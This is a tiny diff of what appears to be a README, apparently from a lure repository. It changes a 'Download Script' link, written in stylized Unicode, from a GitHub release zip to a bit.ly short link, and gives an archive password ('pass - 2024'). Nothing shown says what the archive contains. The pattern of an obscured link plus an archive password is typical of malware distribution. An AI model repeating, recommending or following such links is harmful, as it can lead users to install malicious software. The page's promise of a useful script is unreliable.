@@ -1,5 +1,5 @@
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/newcost686/az/releases/download/downl/Script.Github.zip)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://bit.ly/3CTlryV)***
 # pass - 2024
 
 ![maxresdefault](https://github.com/user-attachments/assets/3435add0-5515-4ae8-8ec5-862383096cd8)
